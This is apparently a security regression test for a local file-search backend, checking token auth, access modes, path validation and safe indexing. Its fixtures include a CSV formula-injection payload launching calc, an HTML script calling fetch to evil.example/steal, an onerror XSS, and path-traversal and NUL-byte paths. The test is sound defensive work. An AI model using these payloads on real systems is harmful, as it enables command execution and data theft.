"""Phase 12 regression: security and privacy, against a throwaway backend.

Starts the real server on a spare port with its own app-data directory
(INTELLIFILE_APP_DATA_DIR) and a per-launch API token, then checks:

- every endpoint refuses requests without the token (401); /health stays
  reachable but reveals nothing without it;
- the file-access policy: unset → indexing refused; limited → a folder and
  a single file can be indexed and searched; denied → refused; the
  whole-computer roots exclude system/app-data folders;
- path validation: relative paths, NUL bytes and `..` are rejected; the
  thumbnail endpoint serves only indexed files;
- document contents are never executed: a CSV formula, an HTML script and
  an RTF object are indexed as text.

Run with:  backend/venv/bin/python backend/scripts/prototype_security.py
"""

import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import requests

BACKEND = Path(__file__).resolve().parents[1]
PORT = 8791
TOKEN = "test-token-not-secret"
BASE = f"http://127.0.0.1:{PORT}"


def wait_ready(proc, timeout=120) -> None:
    end = time.time() + timeout
    while time.time() < end:
        if proc.poll() is not None:
            raise RuntimeError("backend exited early")
        try:
            if requests.get(f"{BASE}/health", timeout=2).ok:
                return
        except requests.RequestException:
            pass
        time.sleep(1)
    raise RuntimeError("backend did not start")


def main() -> None:
    workdir = Path(tempfile.mkdtemp())
    env = {**os.environ, "INTELLIFILE_APP_DATA_DIR": str(workdir / "appdata"), "INTELLIFILE_API_TOKEN": TOKEN, "INTELLIFILE_OFFLINE_GUARD": "1"}
    proc = subprocess.Popen([sys.executable, str(BACKEND / "run_backend.py"), "--port", str(PORT)], cwd=BACKEND, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        wait_ready(proc)
        auth = {"X-IntelliFile-Token": TOKEN}
        docs = workdir / "docs"
        docs.mkdir()
        (docs / "venue.txt").write_text("The reunion venue is the old boathouse by the lake, booked for 14 June.")
        single = workdir / "single.md"
        single.write_text("Single file: the printer's admin password hint is the street we grew up on.")

        # --- 1. Token required everywhere except /health; /health reveals nothing without it ---
        assert requests.get(f"{BASE}/search", params={"q": "venue"}, timeout=10).status_code == 401
        assert requests.post(f"{BASE}/index-folder", json={"folder": str(docs)}, timeout=10).status_code == 401
        assert requests.get(f"{BASE}/status", timeout=10).status_code == 401
        assert requests.get(f"{BASE}/search", params={"q": "venue", "token": "wrong"}, timeout=10).status_code == 401
        h = requests.get(f"{BASE}/health", timeout=10).json()
        assert h["status"] == "ok" and h["app_data_dir"] is None and h["token_required"] is True, h
        assert requests.get(f"{BASE}/health", headers=auth, timeout=10).json()["app_data_dir"]
        assert requests.get(f"{BASE}/status", headers=auth, timeout=30).ok
        assert requests.get(f"{BASE}/status", params={"token": TOKEN}, timeout=30).ok  # query form, for <img>
        print("1. API token: 401 without it or with a wrong one on every endpoint; /health open but blank; header and query forms accepted: OK")

        # --- 2. Access policy: unset refuses; limited allows folder + single file; denied refuses ---
        a = requests.get(f"{BASE}/access", headers=auth, timeout=10).json()
        assert a["mode"] == "unset" and not a["allows_indexing"]
        r = requests.post(f"{BASE}/index-folder", json={"folder": str(docs)}, headers=auth, timeout=10).json()
        assert "error" in r and "access" in r["error"].lower(), r
        r = requests.post(f"{BASE}/access", json={"mode": "limited"}, headers=auth, timeout=10).json()
        assert r["mode"] == "limited" and r["previous"] == "unset"
        assert "queued" in requests.post(f"{BASE}/index-folder", json={"folder": str(docs)}, headers=auth, timeout=10).json()
        assert "queued" in requests.post(f"{BASE}/index-file", json={"folder": str(single)}, headers=auth, timeout=10).json()
        def hits(q):
            return [x["filename"] for x in requests.get(f"{BASE}/search", params={"q": q}, headers=auth, timeout=30).json()["results"]]
        end = time.time() + 60
        while time.time() < end and not ("venue.txt" in hits("boathouse lake") and "single.md" in hits("printer admin password")):
            time.sleep(1)
        assert "venue.txt" in hits("boathouse lake") and "single.md" in hits("printer admin password")
        folders = requests.get(f"{BASE}/status", headers=auth, timeout=30).json()["folders"]
        assert any(f["kind"] == "file" and f["path"] == str(single) for f in folders), folders
        r = requests.post(f"{BASE}/access", json={"mode": "denied"}, headers=auth, timeout=10).json()
        assert r["mode"] == "denied"
        assert "error" in requests.post(f"{BASE}/index-folder", json={"folder": str(docs)}, headers=auth, timeout=10).json()
        assert requests.get(f"{BASE}/status", headers=auth, timeout=30).json()["access"]["allows_indexing"] is False
        r = requests.post(f"{BASE}/access", json={"mode": "limited"}, headers=auth, timeout=10).json()
        assert r["mode"] == "limited" and hits("boathouse lake")  # the index was kept (remove_index not asked)
        assert "error" in requests.post(f"{BASE}/access", json={"mode": "everything"}, headers=auth, timeout=10).json()
        from app.files.access import excluded_paths, whole_computer_roots
        roots, skipped = whole_computer_roots(), excluded_paths()
        assert str(Path.home()) in roots and all(Path(p).is_absolute() for p in skipped)
        assert not any(r.startswith("/System") or r == "/" for r in roots)
        print(f"2. Access policy: unset refuses; limited indexes a folder and a single file (searchable, listed); denied refuses; kept index on downgrade; 'all' roots = {roots} minus {len(skipped)} system paths: OK")

        # --- 3. Path validation and the thumbnail gate ---
        for bad in ("docs", "../../etc", "/tmp/x\x00y", ""):
            r = requests.post(f"{BASE}/index-folder", json={"folder": bad}, headers=auth, timeout=10).json()
            assert "error" in r, (bad, r)
        assert requests.get(f"{BASE}/thumbnail", params={"path": "/etc/hosts", "token": TOKEN}, timeout=10).status_code == 404
        assert requests.get(f"{BASE}/thumbnail", params={"path": str(docs / ".." / "single.md"), "token": TOKEN}, timeout=10).status_code in (404, 422)
        print("3. Path validation: relative, traversal, NUL and empty paths rejected; thumbnails only for indexed files: OK")

        # --- 4. Document contents are data, never executed ---
        (docs / "venue.txt").write_text("The reunion venue is the old boathouse by the lake, booked for 14 June. Parking behind the sailing club.")
        (docs / "sheet.csv").write_text("name,amount\n=cmd|' /C calc'!A0,10\n=HYPERLINK(\"http://evil.example\"),20\n")
        (docs / "page.html").write_text("<html><head><script>fetch('http://evil.example/steal')</script></head><body><p>Visible paragraph about the boathouse.</p><img src=x onerror=\"alert(1)\"></body></html>")
        (docs / "note.rtf").write_text(r"{\rtf1\ansi {\object\objdata 0102}\par Plain rtf words about the lake.\par}")
        end = time.time() + 90
        while time.time() < end and not ("page.html" in hits("visible paragraph boathouse") and "note.rtf" in hits("plain rtf words")):
            time.sleep(1)
        if time.time() >= end:
            st = requests.get(f"{BASE}/status", headers=auth, timeout=30).json()
            print("   (debug) html:", hits("visible paragraph boathouse"), "rtf:", hits("plain rtf words"), "job:", st["job"]["state"], st["job"]["recent_failures"], "folders:", [(f["path"].rsplit("/", 1)[-1], f["documents"]) for f in st["folders"]])
        def hit_for(q, name):
            return next(x for x in requests.get(f"{BASE}/search", params={"q": q}, headers=auth, timeout=30).json()["results"] if x["filename"] == name)
        html_hit = hit_for("visible paragraph boathouse", "page.html")
        assert "fetch(" not in html_hit["chunk_text"] and "onerror" not in html_hit["chunk_text"] and "Visible paragraph" in html_hit["chunk_text"]
        rtf_hit = hit_for("plain rtf words", "note.rtf")
        assert "objdata" not in rtf_hit["chunk_text"] and "Plain rtf words" in rtf_hit["chunk_text"]
        csv_hit = requests.get(f"{BASE}/search", params={"q": '"HYPERLINK"'}, headers=auth, timeout=30).json()["results"]
        assert csv_hit and csv_hit[0]["filename"] == "sheet.csv"
        end = time.time() + 90
        while time.time() < end and "sailing club" not in " ".join(x["chunk_text"] for x in requests.get(f"{BASE}/search", params={"q": "sailing club parking"}, headers=auth, timeout=30).json()["results"]):
            time.sleep(1)
        venues = [x for x in requests.get(f"{BASE}/search", params={"q": "boathouse lake"}, headers=auth, timeout=30).json()["results"] if x["filename"] == "venue.txt"]
        assert len(venues) == 1 and "sailing club" in venues[0]["chunk_text"], f"a modified file must update its one record, not add a second: {[(v['path'], v['chunk_text'][:30]) for v in venues]}"
        guard = requests.get(f"{BASE}/offline-guard", headers=auth, timeout=10).json()
        assert guard["blocked_attempts"] == 0, guard
        print("4. Contents are data: script/onerror stripped from HTML, \\\\objdata dropped from RTF, CSV formulas kept as text; a modified file updates its one record; 0 network attempts: OK")

        print("\nPhase 12 security OK: API token, access policy (all/limited/denied, single files), path validation, untrusted content — all enforced.")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
        shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    sys.path.insert(0, str(BACKEND))
    main()
